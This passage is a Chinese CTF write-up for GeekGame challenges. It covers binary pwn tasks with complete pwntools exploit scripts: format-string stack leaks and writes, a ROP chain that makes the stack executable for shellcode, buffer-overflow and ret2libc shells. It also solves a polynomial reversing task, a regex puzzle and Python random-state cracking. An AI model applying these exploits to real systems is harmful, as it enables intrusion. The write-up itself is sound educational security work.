    '419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=')

payload = '%016lx ' * 30
print(payload)
sh.sendline(payload)

output = sh.recvline()
output = sh.recvline()
ic(output)
# 将输出字符串拆分成单词
words = output.split()
ic(words)

# 解码每个十六进制字符串并打印结果
result = b''
for word in words:
    decoded = binascii.unhexlify(word)
    result += decoded[::-1]
print(result)
```

获得 `flag{re4d_PR1nTf_C0dE_so_e4zY}`

#### Flag 2

思路是使用格式化字符串漏洞，用 `%n` 来修改栈内存。

`checksec` 得到

```
[!] Did not find any GOT entries
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

这个程序是静态链接的。

+ RELRO 是针对 GOT 的，这个程序没有 GOT，所以不需要考虑
+ Stack Canary 是针对栈溢出的，使用格式化字符串可以精确修改，不需要考虑
+ 开启了 NX
+ 开启了 PIE，代码段、数据段都是随机的

##### NX

对于 NX，在程序中发现了 `_dl_make_stack_executable`，可以用其将栈变成可执行的

关于 `_dl_make_stack_executable`，找到了一篇博客 [pwnable.tw kidding](https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/)

`_dl_make_stack_executable` 的汇编代码是

```
Dump of assembler code for function _dl_make_stack_executable:
   0x00007ffff7fbabb0 <+0>:     endbr64
   0x00007ffff7fbabb4 <+4>:     mov    rsi,QWORD PTR [rip+0x4147d]        # 0x7ffff7ffc038 <_dl_pagesize>
   0x00007ffff7fbabbb <+11>:    mov    edx,DWORD PTR [rip+0x4004f]        # 0x7ffff7ffac10 <__stack_prot>
   0x00007ffff7fbabc1 <+17>:    push   rbx
   0x00007ffff7fbabc2 <+18>:    mov    rbx,rdi
   0x00007ffff7fbabc5 <+21>:    mov    rdi,rsi
   0x00007ffff7fbabc8 <+24>:    neg    rdi
   0x00007ffff7fbabcb <+27>:    and    rdi,QWORD PTR [rbx]
   0x00007ffff7fbabce <+30>:    call   0x7ffff7f89b10 <mprotect>
   0x00007ffff7fbabd3 <+35>:    test   eax,eax
   0x00007ffff7fbabd5 <+37>:    jne    0x7ffff7fbabf0 <_dl_make_stack_executable+64>
   0x00007ffff7fbabd7 <+39>:    mov    QWORD PTR [rbx],0x0
   0x00007ffff7fbabde <+46>:    pop    rbx
   0x00007ffff7fbabdf <+47>:    or     DWORD PTR [rip+0x41442],0x1        # 0x7ffff7ffc028 <_dl_stack_flags>
   0x00007ffff7fbabe6 <+54>:    ret
   0x00007ffff7fbabe7 <+55>:    nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff7fbabf0 <+64>:    endbr64
   0x00007ffff7fbabf4 <+68>:    mov    rax,0xffffffffffffffc0
   0x00007ffff7fbabfb <+75>:    pop    rbx
   0x00007ffff7fbabfc <+76>:    mov    eax,DWORD PTR fs:[rax]
   0x00007ffff7fbabff <+79>:    ret
```


它调用了 `mprotect(-_dl_pagesize & *param_1, _dl_pagesize, __stack_prot)`

+ 第一个参数是要改权限的内存页的起始地址
+ `_dl_pagesize` 是页的大小 4096
+ `__stack_prot` 是栈的属性，设为 7，即可读可写可执行

`__stack_prot` 不太容易设置，所以改成设置 `rsi`，直接跳转到 `make_stack_executable+17`，跳过读取这个变量的过程。

目标是栈处作如下修改：

+ 首先让 `rdi = stackEndPointer`，指向数组中的位置（但是 `returnAddress + 18` 附近的地址好像会报段错误，所以用了 `popRdiRbpRet` 的 gadget）
+ 然后 `rdx = 7`
+ 之后设置 `rsi = 4096`
+ 调用 `make_stack_executable+17`
+ 跳转到数组中的 shellcode

```python
addressTargetValue = {
    # rdi -> __libc_stack_end
    returnAddress: popRdiRbpRet,
    # stackEndPointer
    returnAddress + 8: stackEndPointer,
    # rdx = 7
    returnAddress + 16: 0,
    returnAddress + 24: popRdxRet,
    returnAddress + 32: 7,
    # rsi = _dl_pagesize = 4096
    returnAddress + 40: popRsiRet,
    returnAddress + 48: 4096,
    # call make_stack_executable+17
    returnAddress + 56: makeStackExecutable + 17,
    # returnAddress + 56: putcharAddress,
    returnAddress + 64: shellCodeAddress,
}
```

payload 包含了这个格式化字符串，shellcode，以及 `libcStackEnd` 的地址

##### PIE

对于 PIE，用 `%lx` 泄露栈变量地址，用 `%165$lx` 泄露返回地址（代码段函数地址），计算本次运行的变量地址

> 我是先在本地关闭 ASLR 用 pwndbg 调试，跑通后再改成开启 ASLR 的。

有概率成功进 shell，进入后 `cat flag_ec84a22b`，得到 `flag{pWn_0n_STACK_tO0_simPle}`


<details open>
<summary>代码</summary>


```python
from pwn import *
from icecream import ic

sh = process('./pwn')

sh = remote('prob09.geekgame.pku.edu.cn', 10009)
sh.sendlineafter(
    'Please input your token: ',
    '419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=')

context.arch = 'amd64'
shellCode = asm(shellcraft.sh())
ic(shellCode)
ic(len(shellCode))

payload1 = b'%lx'
sh.sendlineafter(b'Please input your instruction:\n', payload1)
receivedLine = sh.recvline()
publicStringAddress = int(receivedLine.strip(), 16)

publicStringAddressRefer = 0x7fffffffdd60
ic(hex(publicStringAddress), hex(publicStringAddressRefer))


def stackReferToReal(referAddress):
    assert 0x7ffffffde000 <= referAddress <= 0x7ffffffff000
    real = publicStringAddress - publicStringAddressRefer + referAddress
    return real


returnAddress = stackReferToReal(0x7fffffffe1f8)
stringStartAddress = stackReferToReal(0x7fffffffdde0)

payload2 = b'%165$lx'
sh.sendlineafter(b'Please input your instruction:\n', payload2)
receivedLine = sh.recvline()
main108Address = int(receivedLine.strip(), 16)

main108AddressRefer = 0x7ffff7f393fd
ic(hex(main108Address), hex(main108AddressRefer))


def codeReferToReal(referAddress):
    assert 0x7ffff7f38000 <= referAddress <= 0x7ffff7fce000
    real = main108Address - main108AddressRefer + referAddress
    return real


receivedLine = sh.recvline()

assert stringStartAddress == publicStringAddress + 0x80
assert returnAddress == publicStringAddress + 0x498
ic(hex(stringStartAddress))
ic(hex(returnAddress))

shellcodeOffset = 392
endAddressOffset = 64
shellCodeAddress = stringStartAddress + shellcodeOffset
stackEndPointer = stringStartAddress + shellcodeOffset + 64
ic(hex(shellCodeAddress))
ic(hex(stackEndPointer))

popRdiRet = codeReferToReal(0x7ffff7f38cd2)
ret = codeReferToReal(0x7ffff7f38cd3)
popRdxRet = codeReferToReal(0x7ffff7f38bdf)
popRdiRbpRet = codeReferToReal(0x7ffff7f3ab1b)
popRsiRet = codeReferToReal(0x7ffff7f4681e)

libcStackEndAddress = stackReferToReal(0x7fffffffd318)
makeStackExecutable = codeReferToReal(0x7ffff7fbabb0)

putcharAddress = codeReferToReal(0x7ffff7f504a0)
testFunctionAddress = codeReferToReal(0x7ffff7f39139)

addressTargetValue = {
    # rdi -> __libc_stack_end
    returnAddress: popRdiRbpRet,
    # returnAddress + 8:
    returnAddress + 8: stackEndPointer,
    # rdx = 7
    returnAddress + 16: 0,
    returnAddress + 24: popRdxRet,
    returnAddress + 32: 7,
    # rsi = _dl_pagesize = 4096
    returnAddress + 40: popRsiRet,
    returnAddress + 48: 4096,
    # call make_stack_executable+17
    returnAddress + 56: makeStackExecutable + 17,
    # returnAddress + 56: putcharAddress,
    returnAddress + 64: shellCodeAddress,
}

for address, value in addressTargetValue.items():
    ic(hex(address), hex(value))

context.bits = 64
payload3 = fmtstr_payload(34, addressTargetValue, write_size='short')

ic(len(payload3))
assert len(payload3) <= shellcodeOffset
assert len(shellCode) <= endAddressOffset

payload3 += b' ' * (shellcodeOffset - len(payload3))
payload3 += shellCode
payload3 += b' ' * (shellcodeOffset + endAddressOffset - len(payload3))
payload3 += libcStackEndAddress.to_bytes(8, 'little')
ic(len(payload3))
assert len(payload3) < 1024

assert not b'\n' in payload3

print(payload3)
ic(len(payload3))
sh.sendlineafter(b'Please input your instruction:\n', payload3)

payload4 = b'ls -al'

payload = payload1 + b'\n' + payload2 + b'\n' + payload3 + b'\n' + payload4 + b'\n'

with open('payload', 'wb') as f:
    f.write(payload)

receiveLine = sh.recvline()
ic(len(receiveLine))

sh.interactive()
```

</details>

<br>

### 15. Baby Stack

#### Flag 1

> 这是我做出的第一道 Pwn 的题目

用 `checksec` 发现只开启了 NX

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

使用 Ghidra 逆向文件，得到

```c
#include <stdio.h>
#include <unistd.h>

int init(EVP_PKEY_CTX* ctx) {
    int iVar1;

    setvbuf(stdin, (char*)0x0, 2, 0);
    setvbuf(stdout, (char*)0x0, 2, 0);
    iVar1 = setvbuf(stderr, (char*)0x0, 2, 0);
    return iVar1;
}

void get_line(char* buffer, int max_len) {
    char* buf;
    int char_count = 0;

    while (char_count < max_len - 1) {
        buf = buffer[char_count];
        read(0, buf, 1);

        if (*buf == '\n')
            break;
        char_count++;
    }
    *buf = '\0';
}

int main(EVP_PKEY_CTX* param_1) {
    unsigned input_size;

    init(param_1);

    puts("Welcome to babystack :)");
    puts("Input the size of your exploitation string (less than 100 chars with the ending \\n or EOF included):");

    scanf("%d", &input_size);
    char buffer[104];

    if (input_size < 101) {
        puts("Please input your string:");
        get_line(buffer, input_size);
    } else
        puts(":(");
    return 0;
}
```

输入的 `input_size` 为 `unsigned`，当 `input_size = 100` 时程序正常运行，但 `get_line` 的实现中有 `max_len - 1`。

当 `input_size = 0` 时程序发生下溢出，可以读入任意长的字符串。

> 当时没有发现 `backdoor` 函数，所以搞得比较复杂。

程序中存在 `system` 函数。并且存在 `/bin/sh` 字符串，但是没有 `pop rdi; ret` 的 gadget，当时不会 ret2libc，所以用了重新跳转到 `main` 函数中间，以使得 `rdi` 指向读入的字符串。

> 跳转到 `main` 函数中间是因为不然会在执行一遍 `init` 函数，程序会崩溃。

`main+137` 将 `rdi` 指向读入的字符串：

```assembly
   0x0000000000401311 <+137>:   lea    rdi,[rip+0xcf4]        # 0x40200c
```

用 pwndbg 调试出读入字符串与返回地址的距离是 128。所以构造 payload 为 `'A' * 120 + main137 + 'B' * 16 + '/bin/sh\0' + 'C' * 112 + ret + system_plt`，第二次读取字符串时只需要输入很短的字符串即可。程序会先跳转到 `main137`，设置 `rdi` 指向 `/bin/sh`，再跳转执行 `ret` 和 `system`。

+ 加入 `ret` 的 gadget 是为了让 xmm 寄存器 16 字节对齐。当时做不出来了，乱查查到了 [pwn system("/bin/sh")失败的原因](https://blog.csdn.net/weixin_42016744/article/details/122422452)
+ 另外还加了 `add rsp, 0x88; ret` 的 gadget，不然有时候会报错（`puts` 可以打印出来，但是 `system` 不能执行，可能是栈覆盖到了 `/bin/sh`）

```python
from pwn import *

sh = process('./challenge1')
sh = remote('prob09.geekgame.pku.edu.cn', 10010)

sh.sendlineafter(
    'Please input your token: ',
    '419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=')

system_plt = 0x401090
puts_plt = 0x401080

ret = 0x40101a
main137 = 0x401311
add_rsp_0x88_ret = 0x401365

payload = b'A' * 120 + main137.to_bytes(8, 'little') + b'B' * 16 + b'/bin/sh\0' + b'C' * 112
payload += ret.to_bytes(8, 'little') + (add_rsp_0x88_ret.to_bytes(8, 'little') + b'D' * 0x88) * 2 + system_plt.to_bytes(z8, 'little')

assert b'\n' not in payload

payload += b'\n1\n'
payload += b'\nls -al\n'

with open('payload', 'wb') as f:
    f.write(b'0\n' + payload)

sh.sendline('0')
print(payload)
sh.sendline(payload)
sh.interactive()
```


#### Flag 2

`checksec` 显示只开启了 NX

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

逆向出源码

```c
#include <stdio.h>
#include <stdlib.h>

int main(EVP_PKEY_CTX* param_1) {
    size_t sVar1;
    char s2[64];
    char s1[32];

    init(param_1);
    puts("please enter your flag~(less than 0x20 characters)");
    scanf("%s", s1);
    sVar1 = strlen(s1);
    if ((int)sVar1 < 0x21) {
        printf("this is your flag: ");
        printf(s1);

        puts("\nWhat will you do to capture it?:");
        scanf("%s", s2);
        puts("so you want to ");
        printf(s2);

        printf("\n and your flag again? :");
        scanf("%s", s1);
        puts(s1);
        puts("go0d_j0b_und_go0d_luck~:)");
    } else
        puts("byebye~");
    return 0;
}
```

程序先读取一个字符串，如果长度不超过 32，打印出来，并读写两个字符串。

+ 存在缓冲区溢出漏洞，可以覆盖返回地址。
+ `printf(s1)` 存在格式化字符串漏洞，可以泄露栈上的数据。

程序中 gadget 很少，所以只能 ret2libc。

+ 先读入一个较长的字符串，覆盖返回地址，跳转到 `main` 函数中间，并设置栈顶为 `__isoc99_scanf` 的 GOT 项
+ 用短字符串泄露 `__isoc99_scanf` 的地址，查询 `libc.so.6`，得到 `libc` 的基址以及 `libc` 中的函数地址
+ 再读入一个短字符串
+ 覆盖返回地址，用 `libc` 中的 gadget 设置 `rdi` 指向 `/bin/sh`，再跳转到 `system` 函数

<details open>
<summary>代码</summary>



```python
from pwn import *
from icecream import ic

sh = process('./challenge2')
file = ELF('./challenge2')

sh = remote('prob09.geekgame.pku.edu.cn', 10011)

sh.sendlineafter(
    'Please input your token: ',
    '419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=')

isoc99_scanf_got = file.got['__isoc99_scanf']
ic(hex(isoc99_scanf_got))

mainAddress = file.symbols['main']
main22 = mainAddress + 22
ic(hex(mainAddress))

payload1 = b'1' * 56 + main22.to_bytes(8, 'little') + isoc99_scanf_got.to_bytes(8, 'little')
sh.sendlineafter('please enter your flag~(less than 0x20 characters)', payload1)

payload2 = b'%8x.' * 5 + b'<%s>'
sh.sendlineafter('please enter your flag~(less than 0x20 characters)', payload2)

sh.recvline()
addressLine = sh.recvline()
ic(addressLine)

scanfAddressStr = addressLine.split(b'<')[1].split(b'>')[0]
ic(len(scanfAddressStr))
scanfAddress = int.from_bytes(scanfAddressStr + b'\x00\x00', 'little')

libcScanfOffset = 0x62110
libcSystemOffset = 0x50d60
libcBinShOffset = 0x1d8698
libcPopRdiRetOffset = 0x2a3e5

libcBaseAddress = scanfAddress - libcScanfOffset
libcSystemAddress = libcBaseAddress + libcSystemOffset
libcBinShAddress = libcBaseAddress + libcBinShOffset
libcPopRdiRetAddress = libcBaseAddress + libcPopRdiRetOffset

ic(hex(scanfAddress), hex(libcBaseAddress))
ic(hex(libcSystemAddress), hex(libcBinShAddress), hex(libcPopRdiRetAddress))


def check(s):
    for i in s:
        if i == 0x20 or i == 0x09 or i == 0x0A or i == 0x0D or i == 0x0B or i == 0x0C:
            ic(hex(i))


plt = file.plt
puts_plt = plt['puts']
retAddress = 0x000000000040101a

payload3 = b'33333333'
sh.sendlineafter('What will you do to capture it?:', payload3)

offset = 56
payload4 = b'4' * offset + libcPopRdiRetAddress.to_bytes(8, 'little') + libcBinShAddress.to_bytes(
    8, 'little') + retAddress.to_bytes(8, 'little') + libcSystemAddress.to_bytes(8, 'little')

sh.sendlineafter('and your flag again?', payload4)

check(payload1)
check(payload2)
check(payload3)
check(payload4)

payload5 = b'ls -al'
sh.sendline(payload5)

payload = payload1 + b'\n' + payload2 + b'\n' + payload3 + b'\n' + payload4 + b'\n' + payload5 + b'\n'

with open('payload', 'wb') as f:
    f.write(payload)

print(payload)
sh.interactive()
```

</details>

<br>

### 16. 绝妙的多项式

#### Baby

逆向出计算部分的源代码：

```c++
    mint* values = new mint[36];
    memset(values, 0, 36 * sizeof(mint));

    for (int i = 0; i < 36; ++i) {
        char ch = inputArray[i];
        mint::mint(&values[i], (int)ch);
    }

    for (int i = 1; i <= 36; ++i) {
        mint sum(0);
        mint product(1);

        for (int j = 0; j < 36; ++j) {
            sum += values[j] * product;
            product *= mint(i);
        }
        if (sum.value() != DAT_00105020[i - 1]) {
            std::cout << "Failed, please try again!" << std::endl;
            return 1;
        }
    }
```

需要输入一个长度为 36 的字符串 `inputArray`，计算结果要与与 `DAT_00105020` 一致。

`mint` 会把输入的数对 998244353 取模，相当于以下函数：

```python
def calculate_sum(char_values):
    sums = []
    for i in range(1, 37):
        sum_i = 0
        product = 1
        for j in range(36):
            sum_i += char_values[j] * product
            sum_i %= 998244353
            product *= i
            product %= 998244353
        sums.append(sum_i)
    return sums


string = 'flag_input_string_here'
string += ' ' * (36 - len(string))

char_values = [ord(char) for char in string]
sums = calculate_sum(char_values)
print(sums)
```

用以下代码提取 `DAT_00105020`：

```python
hexString = 'f6 0c 00 00 09 07 c8 16 da 7b 6b 08 9e ee fb 05 c1 ff d1 24 e2 6a f7 16 05 33 f0 15 f9 23 8c 21 c1 3a 16 33 6e c1 32 03 a7 b4 e7 27 73 80 1d 24 22 f1 c6 01 13 de 73 2d 09 0a fc 07 b7 f7 50 0d dd b1 61 02 8e bb e5 37 c5 1d a7 0d 0c f2 c3 2d 3a b1 cc 00 e4 41 63 2f db 11 06 0b 1a 2a 38 0a b2 09 3c 10 88 be e2 1c 15 fd a9 19 c1 cf 21 26 ac de 70 29 aa 63 a4 08 31 6d 6c 11 78 91 2e 22 dd c9 b9 33 35 d0 98 2f 7a 17 b8 00 e8 11 26 34'

hexBytes = bytes.fromhex(hexString.replace(' ', ''))
ints = [int.from_bytes(hexBytes[i:i + 4], byteorder='little') for i in range(0, len(hexBytes), 4)]
print(ints)
```

扔给 Mathematica 解方程：

```mathematica
p = 998244353;

target = {3318, 382207753, 141261786, 100396702, 617742273,
   385313506, 368063237, 562832377, 857094849, 53657966, 669496487,
   605913203, 29815074, 762568211, 133958153, 223410103, 39956957,
   937802638, 229055941, 767816204, 13414714, 795034084, 184947163,
   171452954, 272370098, 484621960, 430570773, 639750081, 695262892,
   144991146, 292318513, 573477240, 867813853, 798543925, 12064634,
   874910184};

string = {102, 108, 97, 103, 95, 105, 110, 112, 117, 116, 95,
   115, 116, 114, 105, 110, 103, 95, 104, 101, 114, 101, 32, 32, 32,
   32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32};

calculate[string_] := Table[Sum[string[[j + 1]] i^j, {j, 0, 35}], {i, 36}]

vars = Table[Subscript[s, i], {i, 36}];

result = Solve[calculate@vars == target, vars, Modulus -> p]

vars /. Flatten@result // FromCharacterCode
```

得到 `flag{yoU_Are_THE_mA$T3r_of_l@gR4nGe}`

<br>

## Algorithm

### 18. 关键词过滤喵，谢谢喵

当年用正则表达式写 Markdown 转 HTML（程序设计 2 大作业）的时候，正则玩得比较熟练，以至于今年一血了这道题。又是一道二次元题（去年的是 [二次元神经网络](https://gwdx.github.io/post/hackergame2022/#16-%E4%BA%8C%E6%AC%A1%E5%85%83%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C)）

> 这题需要修改评测脚本，自己写一些样例，进行 debug

#### 字数统计喵

所有字符都是等价的，所以先全替换为 `A`，每两个数位间用 `d` 隔开。10 个 `A` 换成 `B`，10 个 `B` 换成 `C`……如果不到 10 个就换成相应的数字

```python
result = '''1
重复把【[^A]】替换成【A】喵
把【$】替换成【d】喵
把【^】替换成【0】喵
'''

letters = 'ABCDE'

for i in range(len(letters) - 1):
    l1 = letters[i]
    l2 = letters[i + 1]
    result += f'重复把【{10*l1}】替换成【{l2}】喵\n'
    result += f'把【({l2}+)】替换成【\\1d】喵\n'
    for i in reversed(range(1, 10)):
        result += f'重复把【{i*l1}】替换成【{i}】喵\n'
    result += '\n'

result += f'把【(\d)d】替换成【\\1】喵\n'
result += f'把【d】替换成【0】喵\n'
result += f'把【^0+】替换成【】喵\n'
result += f'把【^$】替换成【0】喵\n'
result += '谢谢喵\n'

print(result)
```

#### 排序喵

只用正则表达式就能搞定

```
2
把【$】替换成【\n】喵
把【\n+】替换成【\n】喵
把【(.+)】替换成【\1\t\1】喵
重复把【(\tA*)[^A\n]】替换成【\1A】喵
重复把【(.+\t(A+))\n(.+\t\2A+)】替换成【\3\n\1】喵
重复把【((.+\t(?:A+)\n)+)(?:(.+)\t(?:A+))】替换成【\3\n\1】喵
把【(.+)\tA+】替换成【\1】喵
谢谢喵
```

思路：先去掉空行，把每行换成 `abc\tAAA` 的形式，用正则表达式第一个参数的捕获来确定长度的大小关系，核心是这句：

```
重复把【(.+\t(A+))\n(.+\t\2A+)】替换成【\3\n\1】喵
```

不过这样是从大到小排序的，需要改成从小到大排序：

```
重复把【((.+\t(?:A+)\n)+)(?:(.+)\t(?:A+))】替换成【\3\n\1】喵
```

#### Brainfuck 喵

构造代码区、左侧数据区、右侧数据区、输出区域。

+ 代码区是将来要执行的代码
+ 左侧数据区记录指针左侧的数据
+ 右侧数据区记录指针及右侧的数据
+ 输出区域记录输出的字符串

> 数据区均用 `,` 分隔，并且使用 `1` 的个数来表示字符

示例：

```
+.>>.<-.<.+++.------.--------.>>+.>++.
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1111111111111111111111111111111111110,
111111111111111111111111111111110,111111110,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1111111111111111111111111111111111111111111111111111111111111111111111110,
```

首先移除注释的字符，将 `[` `]` 配对，替换为 `A` `B` `C`……

对于将要执行的字符，

+ 如果是 `>`，将右侧数据区的第一个移到左侧
+ 如果是 `<`，将左侧数据区的最后一个移到右侧
+ 如果是 `+`，将左侧数据区的第一个加一（前面添加一个 `1`）
+ 如果是 `-`，将左侧数据区的第一个减一（前面添加一个 `9`）
+ 如果是 `.`，将左侧数据区的第一个添加到输出区域
+ 如果是字母（循环开始），计算当前指向的值，如果是 0，跳过循环（到对应字母处），否则继续循环（将循环体复制出来一遍）

重复上述步骤，直到代码区为空。最后将输出区域的数据转换为字符串。


```python
prevsize = 20
nextsize = 200

prev0 = '0,' * prevsize
next0 = '0,' * nextsize

result = rf'''3
把【[^<>\+\-\.\[\]]】替换成【】喵
把【$】替换成【\n{prev0}\n{next0}\n】喵
把【\[([^\[\]]*)\]】替换成【A\1A】喵
把【\[([^\[\]]*)\]】替换成【B\1B】喵
把【\[([^\[\]]*)\]】替换成【C\1C】喵
把【\[([^\[\]]*)\]】替换成【D\1D】喵
把【\[([^\[\]]*)\]】替换成【E\1E】喵
把【\[([^\[\]]*)\]】替换成【F\1F】喵

开始：
    把【^>(.*)\n(.*)\n(\d+,)(.*)\n(.*)】替换成【\1\n\2\3\n\4\n\5】喵
    把【^<(.*)\n(.*,)(\d+,)\n(.*)\n(.*)】替换成【\1\n\2\n\3\4\n\5】喵
    把【^\+(.*)\n(.*)\n(\d+,)(.*)\n(.*)】替换成【\1\n\2\n1\3\4\n\5】喵
    把【^-(.*)\n(.*)\n(\d+,)(.*)\n(.*)】替换成【\1\n\2\n9\3\4\n\5】喵
    把【^\.(.*)\n(.*)\n((\d+,).*)\n(.*)】替换成【\1\n\2\n\3\n\5\4】喵

    把【19】替换成【】喵
    把【91】替换成【】喵

    如果看到【^\w(.*)\n(.*)\n0,(.*)\n(.*)】就跳转到【跳过循环】喵
    继续循环：
        把【^((\w)(.*?)\2.*)\n(.*)\n(.*)\n(.*)】替换成【\3\1\n\4\n\5\n\6】喵
        如果看到【.】就跳转到【结束循环】喵

    跳过循环：
        把【^(\w).*?\1(.*)\n(.*)\n(.*)\n(.*)】替换成【\2\n\3\n\4\n\5】喵
        如果看到【.】就跳转到【结束循环】喵

    结束循环：
        如果没看到【^\n】就跳转到【开始】喵

结束：
'''

result += rf'''
把【^(.*)\n(.*)\n(.*)\n(.*)】替换成【\4】喵
把【90】替换成【{'1'*255}】喵
重复把【91】替换成【】喵
把【0】替换成【】喵
'''

for i in reversed(range(32, 123)):
    char = chr(i)
    i1 = '1' * i
    if char == '\\':
        char = '\\\\'
    result += f'把【{i1}】替换成【{char}】喵\n'
result += '把【,】替换成【】喵\n'
result += '把【1111111111】替换成【】喵\n'

result += '谢谢喵\n'
print(result)
```

<br>

### 21. 小章鱼的曲奇

#### Smol Cookie

查看服务器代码，需要用已知的 2500 个字符预测 random 的随机数：

```python
the_void = Random(secrets.randbits(256))

smol_cookie = b'flag{test}'
words = b'\0' * 2500 + smol_cookie
ancient_words = xor_arrays(words, the_void.randbytes(len(words)))
print(ancient_words.hex())
```

找到了 [Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)，它可以根据 624 * 4 个字符预测 random 下一个生成的随机数。

```python
from randcrack import RandCrack
from icecream import ic

rc = RandCrack()

with open('1.txt', 'r') as f:
    hexData = f.read()
data = bytes.fromhex(hexData)

for i in range(624):
    rc.submit(int.from_bytes(data[4 * i:4 * (i + 1)], byteorder='little'))

leftData = data[4 * 624:]
leftDataLen = len(leftData)

ic(leftData)

leftRandomInts = [rc.predict_getrandbits(32) for _ in range(leftDataLen // 4)]
leftRandomBytes = b''.join(int.to_bytes(num, 4, byteorder='little') for num in leftRandomInts)
ic(leftRandomBytes)


def xor_arrays(a, b, *args):
    if args:
        return xor_arrays(a, xor_arrays(b, *args))
    return bytes([x ^ y for x, y in zip(a, b)])


xorResult = xor_arrays(leftData, leftRandomBytes)
ic(xorResult)
```

#### Big Cookie

服务端用 22 位的 `entropy` 初始化两个已知种子的 random

```python
seed1 = 0x432c9c5c65b91b13981990a545ac52361bb67cec7326ed0036fdf7ee840dfd81
seed2 = input()
assert seed1 != seed2:

void1 = Random(seed1)
void2 = Random(seed2)
void3 = Random(secrets.randbits(256))

entropy = secrets.randbits(22)
void1.randbytes(entropy)
void2.randbytes(entropy)

big_cookie = b'flag{test}'
words = b'\0' * 2500 + big_cookie
n = len(words)
ancient_words = xor_arrays(words, void1.randbytes(n), void2.randbytes(n), void3.randbytes(n))

print(ancient_words.hex())
```

本来打算枚举一下，结果发现好像和 `entropy` 无关。任何 `entropy` 都可以得到 flag：

```python
from random import Random
from randcrack import RandCrack
from icecream import ic

seed1 = 0x432c9c5c65b91b13981990a545ac52361bb67cec7326ed0036fdf7ee840dfd81
seed2 = 0

with open('2.txt', 'r') as f:
    hexData = f.read()
ciphertext = bytes.fromhex(hexData)


def xor_arrays(a, b, *args):
    if args:
        return xor_arrays(a, xor_arrays(b, *args))
    return bytes([x ^ y for x, y in zip(a, b)])


def crash(a, b, ciphertext):
    rc = RandCrack()
    seed624 = xor_arrays(a[:624 * 4], b[:624 * 4], ciphertext[:624 * 4])
    for i in range(624):
        rc.submit(int.from_bytes(seed624[4 * i:4 * (i + 1)], byteorder='little'))

    leftLength = len(ciphertext[624 * 4:])
    seedLeft = [rc.predict_getrandbits(32) for _ in range(leftLength // 4)]
    seedLeftBytes = b''.join(int.to_bytes(num, 4, byteorder='little') for num in seedLeft)

    plaintext = xor_arrays(ciphertext[624 * 4:], seedLeftBytes, a[624 * 4:], b[624 * 4:])
    ic(plaintext)


def check(i):
    r1 = Random(seed1)
    r2 = Random(seed2)

    r1.randbytes(i)
    r2.randbytes(i)

    a = r1.randbytes(len(ciphertext))
    b = r2.randbytes(len(ciphertext))

    crash(a, b, ciphertext)


for i in range(10):
    check(i)
```

#### SUPA BIG Cookie

题目代码是这样的：

```python
rounds_of_curses = 100
curses = [secrets.randbits(256) for _ in range(rounds_of_curses)]

print('<' + ','.join(map(hex, curses)) + '>')
its_seeds = map(lambda x: int(x, 16), input('> ').split(','))

for curse, its_seed in zip(curses, its_seeds):
    t1 = Random(curse).randbytes(2500)
    t2 = Random(its_seed).randbytes(2500)
    if t1 != t2:
        print('YOU DEMISE HAS OCCURRED.')
        quit()
```

好像只需要把传过来的发回去就行了。我手速不够快，所以用代码：

```python
from pwn import *
from icecream import ic

r = remote('prob08.geekgame.pku.edu.cn', 10008)
r.sendlineafter('Please input your token: ',
                '419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=')

r.sendlineafter(b'Choose one: ', b'3')

r.recvline()
r.recvline()
allData = r.recvline()
print(allData)
validData = allData.split(b'<')[1].split(b'>')[0]
ic(validData)

r.sendline(validData)
r.interactive()
```

<br>

## 后记

去年做了编译助教，为了调试汇编被迫使用 pwndbg，于是学了点二进制。虽然这次剩了一些 Misc 题没有做，但这是我第一次在比赛中做出 Pwn 题，第一次拿到 shell，值得纪念。

今年 GPT4 已经会做小北问答和 TypeScript 的第一问了。恐怕我明年就要被 GPT5 取代了……
